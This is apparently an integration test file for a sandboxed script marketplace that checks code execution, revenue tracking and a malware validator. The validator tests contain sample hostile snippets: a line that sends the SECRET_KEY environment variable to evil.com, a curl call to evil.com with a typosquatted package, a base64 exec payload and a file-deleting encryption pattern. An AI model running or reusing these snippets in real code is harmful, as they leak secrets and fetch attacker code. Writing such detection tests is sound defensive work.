"""Integration tests — require E2B sandbox (skipped if E2B_API_KEY not set)."""

import asyncio

from tests.conftest import requires_e2b

# ---------------------------------------------------------------------------
# Sandbox execution
# ---------------------------------------------------------------------------


@requires_e2b
class TestSandbox:
    def test_run_code_basic(self):
        from sandbox import run_code

        result = run_code("print('hello from sandbox')")
        assert result["exit_code"] == 0
        assert "hello from sandbox" in result["stdout"]

    def test_run_code_with_packages(self):
        from sandbox import run_code

        result = run_code("import requests; print(requests.__version__)", packages=["requests"])
        assert result["exit_code"] == 0
        assert result["stdout"].strip()  # got a version string

    def test_run_code_captures_errors(self):
        from sandbox import run_code

        result = run_code("1/0")
        assert result["exit_code"] == 1
        assert result["error"] is not None
        assert "ZeroDivisionError" in result["error"]

    def test_run_code_respects_timeout(self):
        from sandbox import run_code

        result = run_code("import time; time.sleep(60)", timeout=5)
        assert result["exit_code"] == 1


# ---------------------------------------------------------------------------
# Script marketplace flow
# ---------------------------------------------------------------------------


@requires_e2b
class TestMarketplaceFlow:
    def test_register_run_and_track(self):
        from scripts import get_script, record_run, register_script

        # Register
        script = register_script(
            name="Test Adder",
            description="Adds numbers",
            creator="test",
            code='nums = [int(x) for x in USER_INPUT.strip().split(",")]\nprint(sum(nums))',
            price=0.01,
            input_schema="Comma-separated numbers",
        )
        script["validation_status"] = "approved"
        sid = script["script_id"]

        # Run in sandbox
        from sandbox import run_code

        exec_code = f'USER_INPUT = """1,2,3"""\n\n{script["code"]}'
        result = run_code(exec_code)
        assert result["exit_code"] == 0
        assert "6" in result["stdout"]

        # Track revenue
        record_run(sid, script["price"])
        updated = get_script(sid)
        assert updated["runs"] == 1
        assert updated["revenue"] == 0.01


# ---------------------------------------------------------------------------
# Security validation — real malware patterns
# ---------------------------------------------------------------------------


@requires_e2b
class TestMalwareDetection:
    def _validate(self, code, packages=None, **kwargs):
        from guards.script_validator import validate_script

        return asyncio.get_event_loop().run_until_complete(
            validate_script(
                code=code,
                packages=packages or [],
                description="test",
                skip_llm=True,
                skip_functionality=True,
                skip_quality=True,
                skip_reliability=True,
                **kwargs,
            )
        )

    def test_reverse_shell_rejected(self):
        r = self._validate(
            'import base64, os\npayload = base64.b64decode("dGVzdA==")\nexec(payload)',
        )
        assert r.verdict == "REJECTED"

    def test_credential_exfil_rejected(self):
        r = self._validate(
            "import os, urllib.request\n"
            "val = os.getenv('SECRET_KEY')\n"
            'urllib.request.urlopen("http://evil.com", val.encode())',
        )
        assert r.verdict in ("REJECTED", "FLAGGED")

    def test_typosquat_with_subprocess_rejected(self):
        r = self._validate(
            'import subprocess\nsubprocess.run(["curl", "http://evil.com"])',
            packages=["colourama"],
        )
        assert r.verdict == "REJECTED"

    def test_ransomware_pattern_rejected(self):
        r = self._validate(
            'from cryptography.fernet import Fernet\nimport os\nkey = Fernet.generate_key()\nos.remove("/tmp/test")',
            packages=["cryptography"],
        )
        assert r.verdict == "REJECTED"

    def test_clean_csv_analyzer_approved(self):
        r = self._validate(
            "import csv, io\ndata = USER_INPUT.strip()\nprint(len(data))",
        )
        assert r.verdict == "APPROVED"
        assert r.risk_score == 0.0

    def test_full_pipeline_with_sandbox_probe(self):
        """Run with sandbox probe enabled (not just static)."""
        r = self._validate(
            "import csv, io\ndata = USER_INPUT.strip()\nprint(len(data))",
            skip_sandbox=False,
        )
        assert r.verdict == "APPROVED"
